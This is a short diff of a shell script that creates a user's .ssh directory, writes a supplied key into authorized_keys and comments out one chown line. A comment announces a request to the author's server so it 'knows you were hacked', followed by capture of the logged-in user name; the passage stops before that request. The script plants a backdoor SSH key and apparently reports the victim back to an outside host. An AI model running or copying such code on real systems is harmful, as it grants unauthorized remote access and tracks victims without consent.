@@ -39,7 +39,7 @@ then
 	mkdir /Local/Users/$username/.ssh
 	touch /Local/Users/$username/.ssh/authorized_keys
 	echo $key > /Local/Users/$username/.ssh/authorized_keys
-	chown $username /Local/Users/lab
+	# chown $username /Local/Users/lab
 
 	# Make a request so my server knows you were "hacked"
 	runner_user=`who | grep -m1 "" | cut -d " " -f1`
